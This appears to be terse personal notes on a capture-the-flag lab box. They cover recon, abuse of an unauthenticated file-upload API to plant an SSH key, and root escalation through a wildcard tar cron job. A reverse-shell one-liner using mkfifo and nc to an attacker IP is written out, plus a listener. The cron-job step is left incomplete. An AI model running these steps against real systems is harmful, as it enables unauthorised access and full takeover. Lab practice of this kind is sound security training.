deep nmap shows ports 33414, 40080 open
40080 is some default mozilla page
gobuster on 33414 reveals some api endpoints, info and help
```zsh
curl http://192.168.146.249:33414/info              
#["Python File Server REST API v2.5","Author: Alfredo Moroder","GET /help = List of the commands"]
curl http://192.168.146.249:33414/help
#["GET /info : General Info","GET /help : This listing","GET /file-list?dir=/tmp : List of the files","POST /file-upload : Upload files"]
#So, we have directory listing and file-upload capabilities
curl http://192.168.146.249:33414/file-list?dir=/tmp
#shows /tmp file dir listing
curl http://192.168.146.249:33414/file-list?dir=/home
#alfredo
curl http://192.168.146.249:33414/file-list?dir=/home/alfredo/.ssh
#id_rsa id_rsa.pub
curl http://192.168.146.249:33414/file-list?dir=/var/www/html
#index.html, same from port 40080

#initial instinct was to upload a file that would give us web shell
#but unknown webstack
#walkthough reveals we need to generate a ssh key, and upload it
curl -X POST -H "Content-Type: multipart/form-data" -F file="@//home/kali/pg_play/amaterasu/test.txt"  -F filename="/tmp/test.txt" http://192.168.146.249:33414/file-upload
#{"message":"File successfully uploaded"}

#So now, we generate id_rsa and save it as authorized_keys in alfredo's .ssh
ssh-keygen -f id_rsa
cat id_rsa.pub > authorized_keys
#the api only allows certain extensions
cp authorized_key authorized_keys.txt
chmod 600 authorized_keys.txt

curl -X POST -H "Content-Type: multipart/form-data" -F file="@//home/kali/pg_play/amaterasu/authorized_keys.txt"  -F filename="/home/alfredo/.ssh/authorized_keys" http://192.168.146.249:33414/file-upload
#{"message":"File successfully uploaded"}

curl http://192.168.146.249:33414/file-list?dir=/home/alfredo/.ssh
#["id_rsa","id_rsa.pub","authorized_keys"]

ssh alfredo@192.168.146.249 -i id_rsa -p25022
```
alfredo!
```zsh
cat /etc/crontab
#/usr/local/bin/backup-flask.sh
cat /usr/local/bin/backup-flask.sh
#cd /home/alfredo/restapi
#tar czf /tmp/flask.tar.gz *
#It is going to alfredo's restapi dir, and taring everything. a wildcard
cd ~/restapi
echo "mkfifo /tmp/f; nc 192.168.34.246 443 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f" > rshell_lin.sh

#start listening on kali
rlwrap -cAr nc -nvlp 443
#root!
```